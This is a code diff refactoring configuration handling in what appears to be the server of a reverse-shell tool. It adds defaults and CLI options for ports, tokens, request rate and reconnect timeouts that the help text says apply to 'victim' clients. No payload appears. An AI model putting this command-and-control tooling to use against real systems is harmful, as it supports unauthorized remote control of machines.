@@ -9,7 +9,7 @@ from http import HTTPStatus
 
 # from http.client import HTTPMessage
 from pathlib import Path
-from typing import Any, Optional, TypedDict
+from typing import Optional, TypedDict
 
 import reverse_shell.utils as ut
 from reverse_shell import __app_name__, __version__
@@ -389,6 +389,15 @@ class HandlerResponse:
         self.headers = headers
 
 
+class DefaultCLIArgumentValues:
+    port = 8080
+    ip = "0.0.0.0"
+    min_reconnect_timeout = 10
+    max_reconnect_timeout = 1200
+    request_rate = 1
+    client_idle_duration = 1800
+
+
 class Config:
     def __init__(self, config: Namespace, database: Optional[Database] = None):
         self.config = config
@@ -459,10 +468,12 @@ class Config:
             list: "application/json",
         }
 
-        # ---- IP and port
-        self.port = self.get_port_ip("port", self.config.port, 8080)
-        self.ip = self.get_port_ip("ip", self.config.ip, "0.0.0.0")
-        self.connect_ip = self.get_port_ip(
+        # ---- Address
+        self.port = self.get_address(
+            "port", self.config.port, DefaultCLIArgumentValues.port
+        )
+        self.ip = self.get_address("ip", self.config.ip, DefaultCLIArgumentValues.ip)
+        self.connect_ip = self.get_address(
             "connect_ip", self.config.connect_ip, self.ip
         )
 
@@ -486,7 +497,24 @@ class Config:
         self.is_debug = self.config.debug
 
         # ---- Client idle duration
-        self.client_idle_duration = config.client_idle_duration
+        self.client_idle_duration = self.get_client_idle_duration(
+            self.config.client_idle_duration
+        )
+
+        # --- Timeouts and request rate
+        # These are no use for the server itself, but for the clients that are generated
+        # from it's profile
+        self.get_request_rate(self.config.request_rate)
+        self.get_timeout(
+            "max_reconnect_timeout",
+            self.config.max_reconnect_timeout,
+            DefaultCLIArgumentValues.max_reconnect_timeout,
+        )
+        self.get_timeout(
+            "min_reconnect_timeout",
+            self.config.min_reconnect_timeout,
+            DefaultCLIArgumentValues.min_reconnect_timeout,
+        )
 
         # ---- Saving profile changes
         self.commit_profile()
@@ -497,75 +525,96 @@ class Config:
             self.config.server_base_dir.mkdir(parents=True)
         return self.config.server_base_dir
 
+    def get_request_rate(self, user_selection):
+        """Get the request rate"""
+        return self._get_profile_field(
+            "request_rate", user_selection, DefaultCLIArgumentValues.request_rate
+        )
+
+    def get_timeout(self, profile_field_name, user_selection, default):
+        """Get the timeouts"""
+        return self._get_profile_field(
+            profile_field_name, user_selection, default, "timeouts"
+        )
+
+    def get_client_idle_duration(self, user_selection):
+        """Get the client_idle_duration"""
+        return self._get_profile_field(
+            "client_idle_duration",
+            user_selection,
+            DefaultCLIArgumentValues.client_idle_duration,
+        )
+
     def get_server_cmd_id(self, cmd: str):
         """Get the server command from the profiles."""
-        # Let's first check for the server_cmds entry in the profile
-        # and create it if it doesn't exist
-        if (server_cmds := self.query_profile("server_commands")) is None:
-            self.profile["server_commands"], server_cmds = {}, {}
+        fallback = f"/{ut.generate_token()[:8]}"
+        return self._get_profile_field(cmd, None, fallback, "server_commands")
 
-        # Let's now get the cmd from within the server_cmds
-        cmd_id = self.query_profile(cmd, profile=server_cmds)
+    def get_token(self, token_name: str):
+        """Get the token using the token_name if the token doesn't exist then insert it."""
+        fallback = ut.generate_token()
+        return self._get_profile_field(token_name, None, fallback, "tokens")
 
-        if cmd_id is None:
-            # Let's now create the command id and save it in the profiles
-            cmd_id = f"/{ut.generate_token()[:8]}"
-            self.profile["server_commands"][cmd] = cmd_id
+    def get_address(self, profile_field_name: str, user_selection, default):
+        """Get address from the profile"""
+        return self._get_profile_field(
+            profile_field_name, user_selection, default, "address"
+        )
 
-        return cmd_id
+    def _get_profile_field(
+        self,
+        profile_field_name: str,
+        user_selection,
+        fallback,
+        profile_category_name: Optional[str] = None,
+    ):
+        """Compares the profile field value, user_selection and fallback and returns the one with
+        the highest priority and modifies the profile file accordingly."""
+        # final_selection is the value we will return from the function.
+        # so first we'll set it to the highest priority .i.e user_selection
+        # if that's None we'll fallback to the next priority that is the value
+        # form the profile file and if that doesn't exist we will use our fallback
+        final_selection = user_selection
 
-    def get_port_ip(self, profile_field: str, user_option, default):
-        """Get and validate the ip and port range."""
-        # First check if the field is given then
-        # check for the profile.
-        # Before all that let's check if the 'addresses' field exists
-        # in profile if it doesn't exist, create it.
+        if final_selection is None:
+            # This query will return None if either the category or the profile doesn't exist
+            final_selection = self.query_profile(
+                profile_field_name, profile_category_name
+            )
+            if final_selection is None:
+                # fallback to the default value
+                final_selection = fallback
 
-        if (address := self.query_profile("address")) is None:
-            self.profile["address"], address = {}, {}
+        # Now change the value in the profile file.
+        # first check if the field has a category
+        if profile_category_name is not None:
+            category = self.query_profile(profile_category_name)
+            if category is None:
+                self.profile[profile_category_name] = {}
+            # then set the final_selection to the profile
+            self.profile[profile_category_name][profile_field_name] = final_selection
+        else:
+            self.profile[profile_field_name] = final_selection
 
-        field = user_option
+        return final_selection
 
-        if field is None:
-            # This means the user didn't provide the field
-            # so let's query from the profile if it's found there
-            field = self.query_profile(profile_field, profile=address)
-            if field is None:
-                # the  field is not found in the profile
-                # so let's set the default to the field
-                field = default
+    def query_profile(self, key: str, category_name: Optional[str] = None):
+        """Get a value from the profile file directly, if no category is given, or get
+        the nested key under the category if it is given."""
 
-        # and finally set the field in the profile
-        self.profile["address"][profile_field] = field
-
-        return field
-
-    def query_profile(self, key: str, profile: dict[Any, Any] | None = None):
-        """Get a value in the sessions_file using it's `key`. Returns None if the key is not found in the profile"""
-
-        # Set the profile to self.profile if not given
-        if profile is None:
+        # if no category given then query the profile directly
+        if category_name is None:
             return self.profile.get(key, None)
 
-        return profile.get(key, None)
+        category = self.profile.get(category_name, None)
+        if category is None:
+            return None
+        # Return a key from the category
+        return category.get(key, None)
 
     def commit_profile(self):
         """Save the changes made to `self.profile`"""
         ut.write_json(self.profile_path, self.profile)
-
-    def get_token(self, token_name: str):
-        """Get the token using the token_name if the token doesn't exist then insert it."""
-        # Let's first check for the 'tokens' field
-        if (tokens := self.query_profile("tokens")) is None:
-            self.profile["tokens"], tokens = {}, {}
-
-        token = self.query_profile(token_name, profile=tokens)
-
-        if token is None:
-            token = ut.generate_token()
-            self.profile["tokens"][token_name] = token
-
-        return token
 
     def get_profile(self, profile_name: str):
         """Obtain or generate the server's profile"""
@@ -628,9 +677,34 @@ def get_argument_parser():
         required=False,
         help=(
             "The time(in seconds) that a client is allowed to be referred as online without"
-            " sending any request."
+            f" sending any request.(default={DefaultCLIArgumentValues.client_idle_duration})"
         ),
-        default=1800,
+        default=None,
+    )
+
+    parser.add_argument(
+        "--request-rate",
+        "-rr",
+        type=int,
+        required=False,
+        help=f"The minimum time gap between requests made by a client.(default={DefaultCLIArgumentValues.request_rate})",
+        default=None,
+    )
+
+    parser.add_argument(
+        "--max-reconnect-timeout",
+        type=int,
+        required=False,
+        help=f"The maximum time the victim should not send any requests to the server due to several reasons. This will only be used if there is a problem.(default={DefaultCLIArgumentValues.max_reconnect_timeout}s)",
+        default=None,
+    )
+
+    parser.add_argument(
+        "--min-reconnect-timeout",
+        type=int,
+        required=False,
+        help=f"The minimum time the victim should not send any requests to the server due to several reasons. This will only be used if there is a problem.(default={DefaultCLIArgumentValues.min_reconnect_timeout}s)",
+        default=None,
     )
 
     parser.add_argument(
@@ -638,7 +712,7 @@ def get_argument_parser():
         "--port",
         type=int,
         required=False,
-        help="The port on which the server runs on, default=8080",
+        help="The port on which the server runs on.(default=8080)",
         default=None,
     )
 
@@ -648,8 +722,7 @@ def get_argument_parser():
         type=str,
         required=False,
         help=(
-            "The ip where the server is hosted on. If the ip is 0.0.0.0, the 'connect_ip' must be specified, default=0.0.0.0 i.e, all"
-            " interfaces"
+            "The ip where the server is hosted on. If the ip is 0.0.0.0, the 'connect_ip' must be specified. (default=0.0.0.0) i.e, all interfaces"
         ),
         default=None,
     )
